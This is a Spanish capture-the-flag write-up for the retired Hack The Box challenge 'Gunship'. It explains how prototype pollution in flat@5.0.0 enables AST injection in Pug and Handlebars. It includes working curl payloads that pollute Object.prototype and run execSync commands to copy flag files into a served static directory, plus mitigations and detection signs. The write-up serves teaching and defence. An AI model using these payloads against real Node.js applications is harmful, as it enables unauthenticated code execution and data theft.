---
challenge: Gunship
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, nodejs, express, prototype-pollution, ast-injection, pug, handlebars, rce]
---

# Gunship — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.
> La instancia original (HTB x Uni CTF 2020) usaba **Handlebars**; la copia que sirve la plataforma usa **Pug**. El vector es el mismo y el payload no.

## TL;DR

Express recibe `POST /api/submit`, pasa el JSON por `unflatten()` de `flat@5.0.0` — vulnerable a **prototype pollution** — y compila una plantilla **fija** con el motor de turno. Como el compilador lee propiedades de los nodos del AST (`node.type`, `node.body`) a través de la cadena de prototipos, contaminar `Object.prototype` inyecta un nodo falso: **AST injection**. El valor de ese nodo se concatena sin comillas en el código generado y se ejecuta: RCE en una sola petición, sin autenticación.

## Enunciado y superficie

- Categoría Web, dificultad Easy, retirado.
- Se entrega el código fuente completo (Express + `package.json` + Dockerfile) y una instancia con `IP:puerto`.
- La aplicación es una página de fans que "envía" un artista; el backend responde con un saludo renderizado.

## Reconocimiento

```bash
curl -s -i http://<IP>:<PUERTO>/ | head -20
curl -s http://<IP>:<PUERTO>/package.json
```

En `package.json` están las dos dependencias que importan:

```json
{ "dependencies": { "express": "^4.17.1", "flat": "5.0.0", "pug": "3.0.2" } }
```

`flat@5.0.0` está fijado, no es rango: es la versión vulnerable. El motor (`pug` o `handlebars`) decide el payload.

## Análisis del código

```js
router.post('/api/submit', (req, res) => {
  const { artist } = unflatten(req.body);
  if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
    return res.json({
      response: pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
    });
  }
  return res.json({ response: 'please provide us with the name of an artist' });
});
```

Dos detalles:

- `unflatten()` reconstruye el objeto desde claves con puntos. En `flat@5.0.0` no filtra `__proto__`, así que una clave `__proto__.x` escribe en `Object.prototype` en lugar de en tu objeto.
- La plantilla es **constante**: no hay SSTI clásico. La inyección va por el AST que el compilador recorre.

La comprobación `artist.name.includes(...)` obliga a mandar ese campo en el mismo cuerpo, pero no impide nada: solo hay que incluir uno de los apellidos.

## Explicación del fallo

1. El parser del motor construye un AST y lo recorre llamando a `accept(node)`.
2. `accept` invoca el manejador `this[node.type]` pasándole el nodo. Si `node.type` no existe en el nodo, JavaScript lo busca en el prototipo; contaminado `Object.prototype.type = 'Program'`, el compilador cree que el nodo es un programa completo.
3. En el generador de código, algunos valores se emiten **sin entrecomillar** (son números o posiciones). Si el valor viene de `Object.prototype`, es una cadena arbitraria y acaba como código JavaScript.
4. El motor compila con `new Function(...)`: la cadena se ejecuta.

La ejecución es ciega (la respuesta no devuelve stdout), así que se escribe en un directorio servido estáticamente.

## Reproducción local

```bash
docker build -t gunship .
docker run -p 1337:1337 gunship
```

El contenedor escucha en `1337` y sirve `/static` desde el propio directorio de la app, que es el canal de exfiltración.

## Explotación

### Variante Pug (plataforma actual)

1. Confirmar la contaminación con un nodo de texto inofensivo:

```bash
curl -s http://<IP>:<PUERTO>/api/submit -H 'Content-Type: application/json' \
  -d '{"artist.name":"Haigh","__proto__.block":{"type":"Text","val":"POLLUTED"}}'
```

La respuesta incluye `POLLUTED`: el nodo inyectado se renderizó.

2. Cambiar `val` por `line`, que el generador emite sin comillas, y ejecutar:

```bash
curl -s http://<IP>:<PUERTO>/api/submit -H 'Content-Type: application/json' \
  -d '{"artist.name":"Haigh","__proto__.block":{"type":"Text","line":"process.mainModule.require(\"child_process\").execSync(\"cp /app/flag* /app/static/flag\")"}}'
```

3. Leer el resultado:

```bash
curl -s http://<IP>:<PUERTO>/static/flag
```

### Variante Handlebars (CTF 2020)

```bash
curl -s http://<IP>:<PUERTO>/api/submit -H 'Content-Type: application/json' -d '{
  "artist.name":"Gingell",
  "__proto__.type":"Program",
  "__proto__.body":[{"type":"MustacheStatement","path":0,
    "params":[{"type":"NumberLiteral","value":"process.mainModule.require(\"child_process\").execSync(\"cat flag* > /app/static/out\")"}],
    "loc":{"start":0,"end":0}}]
}'
curl -s http://<IP>:<PUERTO>/static/out
```

En el contenedor **no hay `bash`**: usar `sh` o comandos simples. Si el flag no está en `/app`, `ls /` desde el propio payload lo localiza.

## Evidencia

- Respuesta con el nodo inyectado renderizado y contenido de `/static/flag` recortado.
- Sin flags reales: los valores viven en `private/`.

## Lecciones aprendidas

- `flat@5.0.0` no es "una librería de utilidades": es la puerta de entrada; la versión fijada en `package.json` es el primer dato que hay que mirar.
- Prototype pollution sin gadget conocido no es RCE; con un motor de plantillas que lee el AST por prototipo, sí.
- `{"__proto__": ...}` en JSON no siempre funciona; `"__proto__.clave"` como propiedad plana sí, porque `unflatten` la expande.
- Un payload de Handlebars no funciona contra Pug: hay que identificar el motor antes de copiar el exploit.
- La exfiltración por `/static` evita necesitar reverse shell en un contenedor sin herramientas.

## Mitigaciones y detección

- Actualizar `flat` (≥5.0.1 filtra `__proto__`) y congelar prototipos (`Object.freeze(Object.prototype)`) al arrancar.
- No compilar plantillas con datos que puedan tocar el AST; usar variables (`{{ user }}`) y plantillas constantes.
- Validar el JSON de entrada con un esquema que rechace claves con puntos y `__proto__`/`constructor`/`prototype`.
- Detección: peticiones con `__proto__` en el cuerpo, errores 500 del compilador y escrituras en directorios estáticos servidos por la app.

MITRE: T1190 (exploit public-facing application), T1059.007 (JavaScript), T1027 (obfuscated files or information).

## Referencias

- <https://sec.stealthcopter.com/htb-ctf-write-up-gunship/>
- <https://po6ix.github.io/AST-Injection>
- <https://7rocky.github.io/en/ctf/htb-challenges/web/gunship>
- <https://github.com/advisories/GHSA-8h8p-x289-vvqr>
